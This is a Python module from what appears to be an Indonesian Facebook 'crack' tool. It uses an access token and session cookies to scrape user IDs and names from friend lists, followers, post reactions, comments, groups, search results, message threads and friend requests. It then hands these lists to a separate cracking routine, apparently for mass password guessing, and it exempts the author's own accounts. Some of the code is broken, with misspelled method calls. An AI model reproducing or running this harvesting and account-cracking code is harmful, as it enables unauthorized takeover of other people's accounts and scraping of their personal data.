# coding=utf-8
# coding by Romi Afrizal
from xyz import *
#---
from .main import Crack as crc
from .mainENG import CrackEng as rcr

#--- DUMP ID 
class romi_afrzl:
	
	def __init__(self,token,cookie):
		self.id, self.ENG, self.token, self.cookie = [], [], token, cookie
		self.tolol = (
			'100067807565861',
			'100028434880529',
			'romi.afrizal.102',
			'romi.alfarabi',''
		)
		self.roomz = requests.Session()
		self.url_mb = "https://mbasic.facebook.com" 
		try:
			self.eng = open("data/english.txt","r").read() 
			self.ENG.append(self.eng)
		except (FileNotFoundError, IOError):
			pass
		
	#--- CONVERT ID
	def converter(self,uid):
		if "me" in uid:
			return {"uid":uid}
		elif(re.findall("\w+",uid)):
			r = self.roomz.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
			try:user = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:user = uid
		return {"uid":user}
		
	#--- CONVERT COOKIE DICT TO STRING
	def romz_xyz(self,cookie,venom={}):
		for x in cookie.replace(' ','').strip().split(';'):
			kuki = x.split('=')
			if len(kuki) > 1:
				venom.update({kuki[0]: kuki[1]})
		return venom
	
	#--- CRACK ID PUBLIK
	def PublikGRAPH(self):
		try:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Make sure the target friend list is public ",style='#FF0022'))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Pastikan daftar teman target publik ",style='#FF0022'))
			try:
				if "bahasa_inggris" in self.ENG:
					user = input('%s╰─ %susername/ID public %s> %s'%(p,o,m,k))
				else:
					user = input('%s╰─ %susername/ID publik %s> %s'%(p,o,m,k))
				if user in self.tolol:
					if "bahasa_inggris" in self.ENG:
						exit("%s╰─%s don't be stupid"%(p,m))
					else:
						exit('%s╰─%s gak usah tolol'%(p,m))
			except AttributeError:
				if "bahasa_inggris" in self.ENG:
					exit('%s╰─%s %s not found'%(p,m,user))
				else:
					exit('%s╰─%s %s tidak di temukan'%(p,m,user))
			else:
				uid = self.converter(user)
				po = self.roomz.get(f"https://graph.facebook.com/v13.0/{uid.get('uid')}?fields=friends.limit(5000)&access_token={self.token}",cookies=self.cookie).json()
				for i in po['friends']['data']:
					self.id.append(f"{i['id']}<=>{i['name']}")
				if "bahasa_inggris" in self.ENG:
					sys.stdout.write (f'\r{p}╰─{o} collecting ID{m} >{h} {str(len(self.id))} '),sys.stdout.flush();jeda(0.0050)
				else:
					sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {str(len(self.id))} '),sys.stdout.flush();jeda(0.0050)
		except KeyError:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
		except requests.exceptions.ConnectionError:
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s no connection "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		print('')
		if "bahasa_inggris" in self.ENG: 
			return rcr().romiy(self.id)
		else:
			return crc().romiy(self.id)
		
	#--- CRACK ID MASSAL
	def MassalPublikGRAPH(self):
		if "bahasa_inggris" in self.ENG:
			try:
				jum = int(input('%s╰─ %stotal target %s > %s'%(p,o,m,k)))
			except:jum=1
			tulis(Panel(f"{Te}{U} {til}{O} Make sure the target friend list is public ",style='#FF0022'))
			for t in range(jum):
				t +=1
				try:
					try:
						user = input('%s╰─ %susername/ID public %s%s%s > %s'%(p,o,p,t,m,k))
						if user in self.tolol:
							exit("%s╰─%s don't be stupid"%(p,m))
					except AttributeError:
						exit('%s╰─%s %s not found'%(p,m,user))
					else:
						uid = self.converter(user)
						po = self.roomz.get(f"https://graph.facebook.com/v13.0/{uid.get('uid')}?fields=friends.limit(5000)&access_token={self.token}",cookies=self.cookie).json()
						for i in po['friends']['data']:
							self.id.append(f"{i['id']}<=>{i['name']}")
				except KeyError:
					exit('%s╰─%s failed to fetch ID'%(p,m))
			print (f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} ')
			return rcr().romiy(self.id)
		else:
			try:
				jum = int(input('%s╰─ %sjumlah target %s > %s'%(p,o,m,k)))
			except:jum=1
			tulis(Panel(f"{Te}{U} {til}{O} Pastikan daftar teman target publik ",style='#FF0022'))
			for t in range(jum):
				t +=1
				try:
					try:
						user = input('%s╰─ %susername/ID publik %s%s%s > %s'%(p,o,p,t,m,k))
						if user in self.tolol:
							exit('%s╰─%s gak usah tolol'%(p,m))
					except AttributeError:
						exit('%s╰─%s %s tidak di temukan'%(p,m,user))
					else:
						uid = self.converter(user)
						po = self.roomz.get(f"https://graph.facebook.com/v13.0/{uid.get('uid')}?fields=friends.limit(5000)&access_token={self.token}",cookies=self.cookie).json()
						for i in po['friends']['data']:
							self.id.append(f"{i['id']}<=>{i['name']}")
				except KeyError:
					exit('%s╰─%s gagal mengambil ID'%(p,m))
			print (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} ')
			return crc().romiy(self.id)
			
	#--- CRACK ID FOLLOWERS 
	def FollowPublikGRAPH(self):
		try:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Make sure the target has followers ",style='#FF0022'))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Pastikan target terdapat pengikut ",style='#FF0022'))
			try:
				if "bahasa_inggris" in self.ENG:
					user = input('%s╰─ %susername/ID public %s> %s'%(p,o,m,k))
				else:
					user = input('%s╰─ %susername/ID publik %s> %s'%(p,o,m,k))
				if user in self.tolol:
					if "bahasa_inggris" in self.ENG:
						exit("%s╰─%s don't be stupid"%(p,m))
					else:
						exit('%s╰─%s gak usah tolol'%(p,m))
			except AttributeError:
				if "bahasa_inggris" in self.ENG:
					exit('%s╰─%s %s not found'%(p,m,user))
				else:
					exit('%s╰─%s %s tidak di temukan'%(p,m,user))
			else:
				uid = self.converter(user)
				po = self.roomz.get(f"https://graph.facebook.com/{uid.get('uid')}?fields=name,subscribers.fields(id,name).limit(500000)&access_token={self.token}",cookies=self.cookie).json()
				for i in po['subscribers']['data']:
					self.id.append(f"{i['id']}<=>{i['name']}")
				if "bahasa_inggris" in self.ENG:
					sys.stdout.write (f'\r{p}╰─{o} collecting ID{m} >{h} {str(len(self.id))} '),sys.stdout.flush();jeda(0.0050)
				else:
					sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {str(len(self.id))} '),sys.stdout.flush();jeda(0.0050)
		except KeyError:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
		except requests.exceptions.ConnectionError:
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s no connection "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		print('')
		if "bahasa_inggris" in self.ENG: 
			return rcr().romiy(self.id)
		else:
			return crc().romiy(self.id)
		
	#--- CRACK POST
	def postingan(self,data_):
		try:
			responx = self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
			if "semua 0" in responx:
				if "bahasa_inggris" in self.ENG:
					exit ("%s╰─%s no one responded to posts "%(p,m));jeda(2)
				else:
					exit ("%s╰─%s tidak ada yang menanggapi postingan "%(p,m));jeda(2)
			else:
				xxy=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',responx)
				for i in xxy:
					if "profile.php?" in i[0]:
						self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
					else:
						self.id.ppend(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
					if "bahasa_inggris" in self.ENG:
						sys.stdout.write (f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
					else:
						sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				if "Lihat Selengkapnya" in responx:
					self.postingan("https://mbasic.facebook.com"+parser(responx,"html.parser").find("a",string="Lihat Selengkapnya").get("href"), self.cookie)
		except:
			pass
		print("")
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
		
	#--- CRACK KOMENTAR
	def komentar(self, data_):
		try:
			responx = self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip()),headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
			xxy = parser(responx,'html.parser')
			for oxx in xxy.find_all('h3'):
				for i in oxx.find_all("a", href=True):
					if "profile.php" in i.get("href"):
						xz = i.get("href").split('=')[1]
						bb = xz.split('&')[0]
						xd = i.text
						self.id.append(bb+'<=>'+xd+'\n')
					else:
						xz = i.get("href").split('?')[0]
						bb = xz.split('/')[1]
						xd = i.text
						self.id.append(bb+'<=>'+xd+'\n')
					if "bahasa_inggris" in self.ENG: 
						sys.stdout.write (f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
					else:
						sys.stdout.write (f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
			for aw in xxy.fin_all("a", href=True):
				if "Lihat komentar lainnya…" in aw.text:
					self.komentar("https://mbasic.facebook.com/"+aw.get("href"), self.cookie)
		except:
			pass
		print('')
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
		
	#--- CRACK GROUP
	def groups(self,data_):
		try:
			respon = self.roomz.get(data_, cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
			otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
			for i in otw:
				if "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				if "bahasa_inggris" in self.ENG:
					sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				else:
					sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
			if "Lihat Selengkapnya" in respon:
				self.groups(self.url_mb+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def tambah(self,gc):
					a = self.roomz.get(gc, cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
					b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
								if "bahasa_inggris" in self.ENG:
									sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
								else:
									sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
					if "Lihat Postingan Lainnya" in a:
						self.tambah(self.url_mb+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				self.tambah(f"{self.url_mb}/groups/"+re.search("id=(\\d*)",data_).group(1))
		except:
			pass
		print("")
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
	
	#--- CRACK NAMA 
	def search_name(self,data_,jum):
		try:
			true=False
			rees = self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
			ox = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',rees)
			for i in ox:
				if "profile.php?" in i[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
				if "bahasa_inggris" in self.ENG: 
					sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				else:
					sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in rees:
					self.search_name(parser(rees,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:
			pass
		print("")
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG: 
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
				
	#--- CRACK PESAN 
	def pesan(self,data_):
		try:
			global cook
			rees = parser(self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text,"html.parser")
			cook = json.loads(self.roomz.get(f'https://graph.facebook.com/me?fields=name,id&access_token={self.token}',cookies=self.cookie).text)["id"]
			for xc in rees.find_all('a',href=True):
				if '/messages/read/?tid=cid.c' in xc['href']:
					if 'Pengguna Facebook' in str(xc):
						continue 
					else:
						k = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(xc))
						for idx in list(k.pop()):
							try:
								if idx in cook: 
									continue
								else:
									self.id.append(idx+"<=>"+xc.text)
									if "bahasa_inggris" in self.ENG: 
										sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
									else:
										sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
							except:continue 
			for aw in rees.find_all('a',href=True): 
				if 'Lihat Pesan Sebelumnya' in aw.text:
					self.pesan("https://mbasic.facebook.com"+aw["href"],self.cookie)
		except:
			pass
		print("")
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
	
	#--- CRACK SARAN
	def saran(self,data_,jum):
		try:
			true=False
			rees = self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
			ox = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',rees)
			if len(ox)!=0:
				for i in ox:
					self.id.append(i[0]+"<=>"+i[1])
					if "bahasa_inggris" in self.ENG: 
						sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
					else:
						sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in rees:
					self.saran(self.url_mb+parser(rees,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:
			pass
		print("")
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
	
	#--- PERMINTAAN PERTEMANAN
	def tmann(self,data_,jum):
		try:
			true=False
			rees = self.roomz.get(data_,cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text
			xcc = re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',rees)
			for i in xcc:
				if "?uid" in i[0]:
					self.id.append(re.findall("uid\=(.*?)\&",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",i[0])[0]+"<=>"+i[1])
				if "bahasa_inggris" in self.ENG: 
					sys.stdout.write(f'\r{p}╰─{o} collecting ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				else:
					sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(self.id)} '),sys.stdout.flush();jeda(0.0050)
				if len(self.id)==jum:
					true=True 
					break
			if true==False:
				if "Lihat selengkapnya" in rees:
					self.tmann(self.url_mb+parser(rees,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:
			pass 
		print ('')
		if len(self.id)!=0:
			if "bahasa_inggris" in self.ENG: 
				return rcr().romiy(self.id)
			else:
				return crc().romiy(self.id)
		else:
			if "bahasa_inggris" in self.ENG:
				exit('%s╰─%s failed to fetch ID'%(p,m))
			else:
				exit('%s╰─%s gagal mengambil id'%(p,m))
				